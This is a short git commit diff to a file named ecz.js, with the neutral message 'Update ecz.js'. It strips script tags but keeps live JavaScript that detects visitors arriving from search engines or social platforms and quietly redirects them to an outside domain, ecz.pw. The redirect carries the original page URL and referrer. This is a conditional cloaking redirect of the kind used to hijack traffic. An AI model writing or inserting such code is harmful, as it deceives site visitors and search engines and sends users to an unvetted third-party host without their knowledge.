7673d06a0a86c0f8a4e6fa1fcf8d7c1b03058331
byrecep <92310768+byrecep@users.noreply.github.com>
2022-01-18 20:33:24 +0300

    Update ecz.js

--- ecz.js
+++ ecz.js
@@ -1,6 +1,3 @@
-<script>
 var ars = 'https://ecz.pw/';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-</script>
-<!--ads/auto.txt-->
